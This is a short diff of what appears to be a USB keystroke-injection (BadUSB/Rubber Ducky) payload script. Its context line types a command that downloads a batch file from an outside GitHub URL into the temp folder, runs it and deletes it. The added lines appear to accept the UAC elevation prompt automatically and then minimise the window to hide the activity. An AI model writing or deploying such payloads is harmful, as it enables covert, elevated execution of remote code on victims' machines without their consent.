@@ -4,4 +4,13 @@ GUI r
 DELAY 1500
 STRING cmd.exe /c curl -o "%temp%\script.bat" https://raw.githubusercontent.com/WilleLX1/F0_BK/main/CustomRawHosters/InstallPythonRuby1.9.txt && "%temp%\script.bat" & del "%temp%\script.bat"
 DELAY 500
-CTRL-SHIFT-ENTER
+CTRL-SHIFT ENTER
+DELAY 1500
+LEFT
+DELAY 500
+ENTER
+DELAY 2000
+ALT TAB
+DELAY 500
+GUI DOWN
+DELAY 2000
